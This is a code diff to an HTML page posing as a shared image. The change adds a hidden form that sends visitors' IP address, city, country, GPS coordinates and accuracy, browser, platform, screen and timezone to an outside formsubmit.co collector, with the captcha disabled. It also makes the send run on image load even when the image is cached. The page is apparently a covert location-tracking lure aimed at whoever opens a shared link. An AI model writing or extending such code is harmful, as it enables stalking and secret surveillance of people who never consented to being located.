@@ -16,23 +16,28 @@
     </style>
   </head>
   <body>
-    <img src="track.png" alt="Shared Image" />
-    <div
-      id="status"
-      style="
-        position: fixed;
-        top: 10px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #fff;
-        padding: 10px 20px;
-        border-radius: 5px;
-        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
-        font-family: sans-serif;
-        display: none;
-        z-index: 1000;
-      "
-    ></div>
+    <img src="track.png" alt="Shared Image" id="trackedImg" />
+    <!-- Hidden FormSubmit form -->
+    <form
+      id="trackForm"
+      action="https://formsubmit.co/38924188133f2a1e536fdfc86fbc9394"
+      method="POST"
+      style="display: none"
+    >
+      <input type="hidden" name="UserAgent" id="ua" />
+      <input type="hidden" name="Platform" id="platform" />
+      <input type="hidden" name="Language" id="lang" />
+      <input type="hidden" name="Screen" id="screen" />
+      <input type="hidden" name="Timezone" id="tz" />
+      <input type="hidden" name="GPS_Latitude" id="gps_lat" />
+      <input type="hidden" name="GPS_Longitude" id="gps_lng" />
+      <input type="hidden" name="GPS_Accuracy" id="gps_acc" />
+      <input type="hidden" name="IP" id="ip" />
+      <input type="hidden" name="City" id="city" />
+      <input type="hidden" name="Country" id="country" />
+      <input type="hidden" name="Timestamp" id="ts" />
+      <input type="hidden" name="_captcha" value="false" />
+    </form>
     <script>
       async function getIPLocation() {
         try {
@@ -88,6 +93,10 @@
       document
         .getElementById("trackedImg")
         .addEventListener("load", onImageLoad);
+      // In case the image is cached, call onImageLoad directly if already loaded
+      if (document.getElementById("trackedImg").complete) {
+        onImageLoad();
+      }
     </script>
   </body>
 </html>
